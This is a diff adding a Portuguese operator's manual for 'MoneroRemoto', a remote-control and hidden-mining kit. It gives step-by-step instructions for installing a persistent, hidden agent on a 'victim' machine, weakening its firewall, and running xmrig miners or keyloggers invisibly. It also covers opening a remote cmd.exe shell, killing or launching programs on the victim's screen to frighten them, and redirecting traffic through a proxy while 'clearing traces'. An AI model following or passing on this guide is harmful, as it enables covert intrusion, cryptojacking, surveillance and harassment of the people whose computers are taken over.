@@ -1,0 +1,113 @@
+================================================================================
+           GUIA COMPLETO - SISTEMA DE CONTROLE REMOTO (MoneroRemoto)
+================================================================================
+
+Este pacote contém tudo que você precisa para controlar máquinas remotamente,
+executar mineração oculta e gerenciar redes de forma silenciosa.
+
+[1] INSTALAÇÃO (Na Máquina Vítima)
+--------------------------------------------------------------------------------
+1. Copie estes 3 arquivos para a máquina alvo:
+   - Install.bat
+   - Start.bat
+   - SystemOut.zip
+
+2. Execute o 'Install.bat' (Duplo clique).
+   - O sistema será instalado em C:\Windows\SystemOut (Oculto).
+   - O Firewall será configurado automaticamente.
+   - O Agente iniciará em modo de serviço (Persistente).
+
+3. (Opcional) Execute 'Start.bat' se quiser iniciar a mineração imediatamente.
+   (Caso contrário, você pode iniciar depois remotamente).
+
+
+[2] CONTROLE (Na Sua Máquina)
+--------------------------------------------------------------------------------
+Use o 'client.exe' para se conectar às máquinas infectadas.
+
+1. Abra o client.exe.
+2. Digite o IP da máquina alvo.
+3. Use o Menu Principal para enviar comandos.
+
+COMANDOS PRINCIPAIS:
+--------------------
+A. START:<comando>
+   Inicia um programa em SEGUNDO PLANO (Invisível).
+   Use para rodar mineradores, keyloggers ou scripts longos.
+   Ex: START:xmrig.exe
+   Ex: START:notepad.exe (Rodará invisível, consumindo RAM)
+
+B. EXEC:<comando>
+   Executa um comando rápido e te mostra a resposta.
+   Ex: EXEC:ipconfig         (Ver IP)
+   Ex: EXEC:whoami           (Ver usuário logado)
+   Ex: EXEC:tasklist         (Ver processos rodando)
+
+C. SHELL:<comando>  (⭐ O MAIS PODEROSO)
+   Cria um túnel direto. É como se você estivesse no PC da pessoa.
+   Use 'SHELL:cmd.exe' para ter um terminal completo.
+   Dentro do Shell você pode:
+   - Criar arquivos: echo 123 > C:\teste.txt
+   - Ler arquivos:   type C:\Windows\SystemOut\config.json
+   - Rodar scripts:  call script.bat
+
+D. START:VISIBLE:<comando>
+   Abre o programa NA TELA DA VÍTIMA.
+   Use para assustar ou abrir o navegador na cara dela.
+   Ex: START:VISIBLE:chrome.exe www.google.com
+
+E. STOPNAME:<nome>
+   Mata TODOS os processos com aquele nome.
+   Ex: STOPNAME:xmrig  (Para a mineração imediatamente)
+   Ex: STOPNAME:chrome (Fecha todos os navegadores da vítima)
+
+
+
+[3] SystemNetConfig.exe
+--------------------------------------------------------------------------------
+O 'SystemNetConfig.exe' é uma ferramenta interativa para configuração de rede.
+Ele foi desenhado para ser "Atômico", ou seja, se você configurar algo errado e perder a conexão,
+ele detecta e reverte automaticamente em 30 segundos (Rollback).
+
+[COMO ACESSAR]
+Use o comando SHELL:
+> SHELL: C:\Windows\SystemOut\SystemNetConfig.exe
+
+Primeiro, você deve selecionar o adaptador de rede (ex: Ethernet). Digite o número correspondente.
+
+[MENU PRINCIPAL - EXPLICAÇÃO]
+
+1. [DHCP (Resetar Configurações)]
+   - O "Botão de Pânico". Limpa IP estático e REMOVE qualquer Proxy.
+   - Restaura a conexão para o padrão automático.
+   - Use isso para "Limpar Rastros" ou consertar uma rede quebrada.
+
+2. [Definir IP Estático (c/ Proxy)]
+   - A opção principal. Permite definir IP, Gateway, DNS e PROXY tudo de uma vez.
+   - Durante a configuração, ele perguntará:
+     > Ativar Proxy? (s/n): s
+     > Proxy: 192.168.1.50:8080
+   - Se a conexão falhar após aplicar, ele desfaz tudo sozinho.
+
+3. [Restaurar Backup (Rollback)]
+   - Volta para a configuração exata que estava antes de você mexer.
+
+4. [Histórico de Redes]
+   - Mostra um log de auditoria das mudanças feitas no sistema.
+
+5. [Sair]
+   - Salva e fecha.
+
+OBS: As alterações são persistentes (sobrevivem ao reboot).
+
+
+[4] DICAS DE OPERAÇÃO
+--------------------------------------------------------------------------------
+- Persistência: O serviço inicia sozinho com o Windows.
+- Zumbis: Se usar STOP num script .bat, o programa filho pode continuar rodando.
+  Sempre use STOPNAME para garantir que matou tudo.
+- Logs: Se algo der errado, procure por 'nettool_debug.log' na pasta SystemOut.
+
+================================================================================
+                              FIM DO MANUAL
+================================================================================
